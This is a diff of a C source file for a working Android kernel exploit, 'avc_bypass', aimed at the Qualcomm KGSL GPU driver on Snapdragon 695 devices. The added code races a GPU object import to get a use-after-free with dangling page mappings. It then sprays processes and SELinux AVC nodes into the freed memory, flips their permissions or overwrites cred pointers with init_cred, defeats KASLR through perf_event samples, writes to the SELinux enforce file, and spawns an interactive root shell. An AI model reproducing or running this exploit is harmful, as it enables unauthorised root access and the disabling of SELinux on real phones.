@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,22 +6,28 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
+#include <pthread.h>
+#include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sys/prctl.h>
-#include <sys/wait.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-#include <sys/ioctl.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
 #include <sys/syscall.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/sem.h>
+#include <sys/shm.h>
+#include <sys/sysmacros.h>
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <time.h>
 #include <signal.h>
 #include <dirent.h>
-#include <pthread.h>
 #include <poll.h>
 
-/* ============ KGSL 定義 ============ */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -70,37 +74,63 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
+#define UAF_ADDR  0x7001ff000ULL
 #define UAF_SIZE  0x10004000ULL
-#define OVERLAP_SIZE 0x1000
+#define OVERLAP_ADDR 0x7001fe000ULL
+#define OVERLAP_SIZE 0x7000ULL
+#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_SIZE 0xffffffffffefd000ULL
+#define PLACEHOLDER_ADDR 0x710204000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL
+
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
 #define SPRAY_PIDS 2000
+#define CHURN_MAX_PATHS 20000
 #define OVERLAP_COUNT 200
 
 #define VMLINUX_TEXT 0xffffffc010080000ULL
 #define VMLINUX_INIT_CRED_OFFSET 0x26fa738
 
 static int kgsl_fd = -1;
+static volatile int race_done = 0;
+static uint64_t alloc_flags = 0;
+static int uaf_id = -1;
+static void *uaf_map = NULL;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
-/* ============ KGSL 基本操作 ============ */
+static uint32_t pm4_parity(uint32_t v) {
+    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
+}
+
+static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
+    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
+}
+#define CP_NOP 0x10
+#define CP_MEM_WRITE 0x3D
+#define CP_MEM_TO_MEM 0x73
+
+static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
+    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
+}
+
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
     return a.id;
 }
+
 static void gpuobj_free(unsigned int id) {
     struct kgsl_gpuobj_free f = { .id = id };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
 }
+
 static void *gpuobj_mmap(size_t size, unsigned int id) {
     void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
     if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
 }
-static void gpuobj_munmap(void *addr, size_t size) {
-    if (munmap(addr, size) < 0) die("gpuobj_munmap");
-}
+
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
@@ -108,60 +138,103 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-/* ============ KASLR 検出 ============ */
-static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
-    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
+static unsigned int create_context(void) {
+    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
+    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
+    return c.drawctxt_id;
 }
-static uint64_t detect_kaslr(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
-    int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) return 0;
-
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-
-    uint64_t first_ip = 0;
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            first_ip = *(uint64_t *)(hdr + 1);
-            break;
-        }
-        tail += hdr->size;
+static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
+    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
+    for (int i = 0; i < 100000; i++) {
+        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
+        if (r.timestamp >= target) return 0;
+        usleep(100);
     }
-    munmap(buf, mmap_size);
-    close(fd);
-    if (first_ip == 0) return 0;
-    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
+    return -2;
 }
 
-/* ============ チャーン（AVCノード生成） ============ */
-#define CHURN_MAX_PATHS 20000
-static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
+static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
+    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
+    struct kgsl_command_object cmd_obj = {
+        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
+        .flags = KGSL_CMDLIST_IB, .id = ib_id
+    };
+    struct kgsl_gpu_command gc = {0};
+    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
+    gc.cmdsize = sizeof(cmd_obj);
+    gc.numcmds = 1;
+    gc.context_id = ctx_id;
+    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
+    if (out_ts) *out_ts = gc.timestamp;
+    return ret;
+}
+
+static void phase1_rbtree(void) {
+    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    uaf_map = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_map == MAP_FAILED) die("mmap UAF");
+
+    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
+
+    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
+    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
+    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
+
+    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
+        (unsigned long)PLACEHOLDER_ADDR);
+}
+
+static void *race_thread(void *arg) {
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
+    struct kgsl_gpuobj_import imp = {
+        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
+    };
+    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
+    return NULL;
+}
+
+static int phase2_race(void) {
+    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+    pthread_t thr;
+    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
+
+    int hit = 0;
+    for (int i = 0; i < 5000000; i++) {
+        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
+            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
+            kgsl_fd, (off_t)ov_id << 12);
+        int e = errno;
+        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (e == ENODEV) { hit = 1; break; }
+        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
+    }
+
+    race_done = 1;
+    pthread_join(thr, NULL);
+    if (!hit) { printf("[-] Race failed\n"); return 0; }
+    printf("[+] Race won!\n");
+    return 1;
+}
+
+static void phase3_free_uaf(void) {
+    gpuobj_free(uaf_id);
+    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
+}
+
+static void phase4_reclaim(void) {
+    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
+    if (rf >= 0) { write(rf, "1", 1); close(rf); }
+    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
+    if (rf >= 0) { write(rf, "3", 1); close(rf); }
+    usleep(10000);
+}
 
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
@@ -171,6 +244,10 @@ static const char *churn_dirs[] = {
     "/system/lib64", "/data/data", "/data/app", "/data/user/0",
     "/dev", "/proc",
 };
+
+static char churn_paths[CHURN_MAX_PATHS][160];
+static int churn_npaths = 0;
+static int churn_built = 0;
 
 static void churn_walk(const char *dir, int depth) {
     if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
@@ -238,41 +315,6 @@ static void churn_round_intensive(void) {
     }
 }
 
-/* ============ 子プロセス ============ */
-static pid_t spray_pids[SPRAY_PIDS];
-static int n_spray = 0;
-
-static void spawn_spray(int notify_pipe) {
-    printf("[SPRAY] spawning...\n");
-    for (int i = 0; i < SPRAY_PIDS; i++) {
-        pid_t p = fork();
-        if (p == 0) {
-            prctl(PR_SET_NAME, "UAF_TASK");
-            for (int j = 0; j < 600; j++) {
-                if (getuid() == 0) {
-                    write(notify_pipe, &p, sizeof(p));
-                    // rootになったらシェルを起動（この中でsetenforce 0を実行可能）
-                    execl("/system/bin/sh", "sh", NULL);
-                    _exit(0);
-                }
-                usleep(100000);
-            }
-            _exit(0);
-        } else if (p > 0) {
-            spray_pids[n_spray++] = p;
-        } else {
-            break;
-        }
-    }
-    printf("[SPRAY] %d children\n", n_spray);
-}
-
-static void kill_spray_children(void) {
-    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
-    while (waitpid(-1, NULL, 0) > 0);
-}
-
-/* ============ setenforce 0 ============ */
 static int try_setenforce0(void) {
     int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
     if (fd < 0) return 0;
@@ -281,121 +323,237 @@ static int try_setenforce0(void) {
     return (w == 1);
 }
 
-/* ============ メイン ============ */
-int main(int argc, char **argv) {
-    setbuf(stdout, NULL);
-    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 最終版\n");
-    printf("[*] 戦略: UAF + 物理ページ再利用 → credポインタ書き換え → root化 → setenforce 0\n");
+static pid_t spray_pids[SPRAY_PIDS];
+static int n_spray = 0;
 
-    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) die("open kgsl");
-    printf("[+] kgsl fd=%d\n", kgsl_fd);
-
-    // KASLR 検出
-    uint64_t kaslr = detect_kaslr();
-    if (!kaslr) {
-        printf("[-] KASLR detection failed\n");
-        close(kgsl_fd);
-        return 1;
+static void spawn_spray(void) {
+    printf("[SPRAY] spawning...\n");
+    for (int i = 0; i < SPRAY_PIDS; i++) {
+        pid_t p = fork();
+        if (p == 0) {
+            prctl(PR_SET_NAME, "TASKUAF!!");
+            for (;;) usleep(200000);
+        }
+        if (p > 0) spray_pids[n_spray++] = p;
+        else break;
     }
-    printf("[+] KASLR = 0x%lx\n", kaslr);
-    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[*] init_cred = 0x%lx\n", init_cred_addr);
+    printf("[SPRAY] %d children\n", n_spray);
+}
 
-    // ---- Phase 1: 巨大オブジェクト確保 + mmap + munmap + 解放 ----
-    printf("[*] Phase 1: Allocate large object, mmap, munmap, free\n");
-    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    int large_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
-    printf("[+] Large object id=%d\n", large_id);
-    void *large_map = gpuobj_mmap(UAF_SIZE, large_id);
-    printf("[+] mmap at %p\n", large_map);
-    gpuobj_munmap(large_map, UAF_SIZE);
-    printf("[+] munmap done\n");
-    gpuobj_free(large_id);
-    printf("[+] Freed\n");
-
-    // ---- Phase 2: メモリ回収 ----
-    printf("[*] Phase 2: Reclaim memory\n");
-    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
-    if (rf >= 0) { write(rf, "1", 1); close(rf); }
-    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (rf >= 0) { write(rf, "3", 1); close(rf); }
-    usleep(10000);
-
-    // ---- Phase 3: チャーン（AVCノードを同じページに配置させる） ----
-    printf("[*] Phase 3: Intensive churn to place avc_nodes on freed pages\n");
-    for (int c = 0; c < 5; c++) {
-        churn_round_intensive();
-        printf("[CHURN] round %d done\n", c+1);
+static void kill_spray_children(void) {
+    int killed = 0;
+    for (int i = 0; i < n_spray; i++) {
+        kill(spray_pids[i], SIGKILL);
+        killed++;
     }
+    while (waitpid(-1, NULL, 0) > 0) ;
+    printf("[KILL] %d spray children killed+reaped\n", killed);
+}
 
-    // ---- Phase 4: 小さなオブジェクトを多数確保しmmap（解放ページの再利用を狙う） ----
-    printf("[*] Phase 4: Allocate small objects to reuse freed pages, and mmap them\n");
+static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
+    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
+}
+
+static uint64_t detect_kaslr(void) {
+    struct perf_event_attr pe = {0};
+    pe.type = PERF_TYPE_HARDWARE;
+    pe.size = sizeof(pe);
+    pe.config = PERF_COUNT_HW_CPU_CYCLES;
+    pe.sample_type = PERF_SAMPLE_IP;
+    pe.sample_period = 100;
+    pe.disabled = 1;
+    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
+
+    int fd = perf_open(&pe, 0, -1, -1, 0);
+    if (fd < 0) return 0;
+
+    int npages = 256;
+    size_t mmap_size = (1 + npages) * 4096;
+    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+    if (buf == MAP_FAILED) { close(fd); return 0; }
+
+    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
+    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+    usleep(500000);
+    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
+    uint64_t head = pmp->data_head;
+    uint64_t tail = pmp->data_tail;
+    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
+    uint64_t data_size = pmp->data_size;
+
+    uint64_t first_ip = 0;
+    while (tail < head) {
+        uint64_t idx = tail & (data_size - 1);
+        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
+        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
+            first_ip = *(uint64_t *)(hdr + 1);
+            break;
+        }
+        tail += hdr->size;
+    }
+    munmap(buf, mmap_size);
+    close(fd);
+    if (first_ip == 0) return 0;
+    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
+}
+
+static void cred_overwrite_method(uint64_t init_cred_addr) {
+    printf("[*] Fallback: cred overwrite method\n");
+    uint64_t alloc_flags_no_cpu = KGSL_CACHEMODE_WRITEBACK;
     void *small_maps[OVERLAP_COUNT];
     int small_ids[OVERLAP_COUNT];
     int success = 0;
 
     for (int i = 0; i < OVERLAP_COUNT; i++) {
-        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
+        int id = gpuobj_alloc(0x1000, alloc_flags_no_cpu);
         if (id < 0) continue;
-        void *map = gpuobj_mmap(OVERLAP_SIZE, id);
+        void *map = gpuobj_mmap(0x1000, id);
         if (map == MAP_FAILED) { gpuobj_free(id); continue; }
         small_ids[success] = id;
         small_maps[success] = map;
         success++;
         if (success >= OVERLAP_COUNT) break;
     }
-    printf("[+] Successfully mapped %d small objects\n", success);
-    if (success == 0) {
-        printf("[-] Failed to map any small objects\n");
-        close(kgsl_fd);
-        return 1;
-    }
+    printf("[+] Mapped %d small objects\n", success);
+    if (success == 0) return;
 
-    // ---- Phase 5: 各マッピングにinit_credを書き込む（credポインタを上書き） ----
-    printf("[*] Phase 5: Write init_cred to every 8-byte aligned offset in mapped pages\n");
-    int writes = 0;
     for (int i = 0; i < success; i++) {
         uint64_t *ptr = (uint64_t *)small_maps[i];
-        // ページ内の0x500〜0xA00を8バイト単位で書き込み（credポインタのオフセット範囲）
         for (uint64_t off = 0x500; off < 0xA00; off += 8) {
             ptr[off/8] = init_cred_addr;
-            writes++;
         }
     }
-    printf("[+] Total writes: %d\n", writes);
     __sync_synchronize();
 
-    // ---- Phase 6: 子プロセスをスプレー（task_structが書き換えられたページに配置される） ----
     int pipefd[2];
-    if (pipe(pipefd) < 0) die("pipe");
+    if (pipe(pipefd) < 0) { perror("pipe"); return; }
     fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
     fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);
 
-    spawn_spray(pipefd[1]);
+    pid_t pids[SPRAY_PIDS];
+    int n = 0;
+    for (int i = 0; i < SPRAY_PIDS; i++) {
+        pid_t p = fork();
+        if (p == 0) {
+            prctl(PR_SET_NAME, "UAF_TASK");
+            for (int j = 0; j < 600; j++) {
+                if (getuid() == 0) {
+                    write(pipefd[1], &p, sizeof(p));
+                    execl("/system/bin/sh", "sh", NULL);
+                    _exit(0);
+                }
+                usleep(100000);
+            }
+            _exit(0);
+        } else if (p > 0) {
+            pids[n++] = p;
+        }
+    }
     close(pipefd[1]);
 
-    // ---- Phase 7: root化を待つ ----
-    printf("[*] Phase 7: Waiting for root...\n");
     struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
     pid_t winner = 0;
     if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
         printf("[+] ROOT! PID=%d\n", winner);
-        for (int i = 0; i < n_spray; i++) {
-            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
-        }
-        while (waitpid(-1, NULL, WNOHANG) > 0);
+        for (int i = 0; i < n; i++) if (pids[i] != winner) kill(pids[i], SIGKILL);
         waitpid(winner, NULL, 0);
-        printf("[+] Root shell exited.\n");
     } else {
-        printf("[-] No child became root within timeout.\n");
-        kill_spray_children();
-        close(kgsl_fd);
-        return 1;
+        printf("[-] No root\n");
+    }
+    close(pipefd[0]);
+    for (int i = 0; i < success; i++) {
+        munmap(small_maps[i], 0x1000);
+        gpuobj_free(small_ids[i]);
+    }
+}
+
+static void root_shell(void) {
+    printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+    fflush(stdout);
+    char buf[512];
+    while (fgets(buf, sizeof(buf), stdin) != NULL) {
+        if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
+        buf[strcspn(buf, "\n")] = 0;
+        if (buf[0] == 0) continue;
+        int st = system(buf);
+        (void)st;
+        printf("# ");
+        fflush(stdout);
+    }
+    printf("[-] Root shell exited\n");
+}
+
+int main(int argc, char **argv) {
+    setbuf(stdout, NULL);
+    bool want_shell = false;
+    for (int i = 1; i < argc; i++)
+        if (strcmp(argv[i], "-i") == 0) want_shell = true;
+
+    printf("[*] avc_bypass v3: uid=%d euid=%d\n", getuid(), geteuid());
+
+    uint64_t kaslr = detect_kaslr();
+    if (!kaslr) { printf("[-] KASLR detection failed\n"); return 1; }
+    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
+    printf("[+] KASLR=0x%lx init_cred=0x%lx\n", kaslr, init_cred_addr);
+
+    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
+    if (kgsl_fd < 0) die("open kgsl");
+    printf("[+] kgsl fd=%d\n", kgsl_fd);
+
+    printf("[*] Phase 1: Setup rbtree\n");
+    phase1_rbtree();
+
+    printf("[*] Phase 2: Race\n");
+    if (!phase2_race()) { close(kgsl_fd); return 1; }
+
+    printf("[*] Phase 3: Free UAF\n");
+    phase3_free_uaf();
+
+    printf("[*] Phase 4: Reclaim\n");
+    phase4_reclaim();
+
+    spawn_spray();
+    kill_spray_children();
+    usleep(100000);
+
+    printf("[*] Phase 5: Intensive churn to allocate AVC nodes\n");
+    for (int c = 0; c < 5; c++) churn_round_intensive();
+
+    printf("[*] Phase 6: Scan UAF region via CPU mapping for avc_node\n");
+    int flips = 0;
+    uint32_t *p = (uint32_t *)uaf_map;
+    for (size_t i = 0; i + 3 < UAF_SIZE/4; i += 72/4) {
+        if (p[i] >= 1 && p[i] <= 0x3fff && p[i+1] == 2 && p[i+2] == 1) {
+            p[i+3] = 0xFFFFFFFF;
+            flips++;
+        }
+    }
+    printf("[*] Flips: %d\n", flips);
+
+    int ok = 0;
+    if (flips > 0) {
+        __sync_synchronize();
+        ok = try_setenforce0();
+        if (!ok) {
+            sleep(1);
+            ok = try_setenforce0();
+        }
     }
 
-    // ---- Phase 8: SELinux状態確認 ----
-    printf("[*] SELinux status:\n");
+    if (!ok) {
+        printf("[!] AVC flip failed, falling back to cred overwrite\n");
+        cred_overwrite_method(init_cred_addr);
+        ok = try_setenforce0();
+    }
+
+    if (ok) {
+        printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
+    } else {
+        printf("[-] All methods failed\n");
+    }
+
     int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
     if (fd >= 0) {
         char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
@@ -403,18 +561,6 @@ int main(int argc, char **argv) {
         if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
     }
 
-    // 念のためsetenforce 0を試す（rootなら成功するはず）
-    if (try_setenforce0()) {
-        printf("[+] SELinux permissive!\n");
-    } else {
-        printf("[-] setenforce 0 failed (but root shell may already be running)\n");
-    }
-
-    // 後片付け
-    for (int i = 0; i < success; i++) {
-        gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
-        gpuobj_free(small_ids[i]);
-    }
-    close(kgsl_fd);
-    return 0;
+    if (want_shell && getuid() == 0) root_shell();
+    return ok ? 0 : 1;
 }
